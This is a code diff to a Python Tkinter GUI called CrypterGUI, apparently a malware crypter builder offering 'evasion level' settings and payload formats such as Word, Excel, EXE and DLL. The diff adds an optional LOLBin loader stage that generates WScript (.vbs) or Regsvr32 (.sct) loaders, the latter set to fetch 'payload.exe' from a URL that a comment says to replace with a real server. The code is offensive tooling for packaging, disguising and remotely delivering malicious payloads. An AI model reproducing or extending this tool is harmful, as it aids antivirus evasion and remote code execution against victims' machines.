@@ -24,6 +24,7 @@ class CrypterGUI:
         self.encryption_method = tk.StringVar(value="AES-GCM")
         self.evasion_level = tk.StringVar(value="High")
         self.target_format = tk.StringVar(value="Word Document")
+        self.loader_type = tk.StringVar(value="Aucun")
         
         self.setup_ui()
         
@@ -78,6 +79,15 @@ class CrypterGUI:
         format_combo = ttk.Combobox(format_frame, textvariable=self.target_format,
                                    values=["Word Document", "Excel Document", "Standalone EXE", "DLL"])
         format_combo.pack(anchor=tk.W, padx=10, pady=5)
+
+        # LOLBAS Loader
+        loader_frame = ttk.LabelFrame(main_frame, text="LOLBin Loader (optional)")
+        loader_frame.pack(fill=tk.X, pady=(0, 10))
+
+        ttk.Label(loader_frame, text="Technique de Loader :").pack(anchor=tk.W, padx=10, pady=5)
+        loader_combo = ttk.Combobox(loader_frame, textvariable=self.loader_type,
+                                   values=["Aucun", "WScript", "Regsvr32"])
+        loader_combo.pack(anchor=tk.W, padx=10, pady=5)
         
         # Output directory
         output_frame = ttk.LabelFrame(main_frame, text="Output Directory")
@@ -153,7 +163,24 @@ class CrypterGUI:
             if success:
                 self.log_message(f"Build completed successfully!")
                 self.log_message(f"Output: {output_path}")
-                messagebox.showinfo("Success", f"Crypter built successfully!\nOutput: {output_path}")
+                
+                # Loader LOLBAS (optionnel)
+                loader_type = self.loader_type.get()
+                if loader_type != "Aucun":
+                    self.log_message(f"📦 Génération loader LOLBAS ({loader_type})...")
+                    try:
+                        from modules.loaders.wscript_loader import WScriptLoader
+                        from modules.loaders.regsvr32_loader import Regsvr32Loader
+                        
+                        if loader_type == "WScript":
+                            WScriptLoader().generate_loader(output_path, self.output_dir.get())
+                            self.log_message("✅ Loader WScript (.vbs) généré.")
+                        elif loader_type == "Regsvr32":
+                            # ⚠️ Change cette URL si tu veux un vrai serveur HTTP
+                            Regsvr32Loader().generate_loader("http://127.0.0.1/payload.exe", self.output_dir.get())
+                            self.log_message("✅ Loader Regsvr32 (.sct) généré.")
+                    except Exception as e:
+                        self.log_message(f"❌ Erreur génération loader : {e}")
             else:
                 self.log_message("Build failed!")
                 messagebox.showerror("Error", "Build process failed. Check the log for details.")
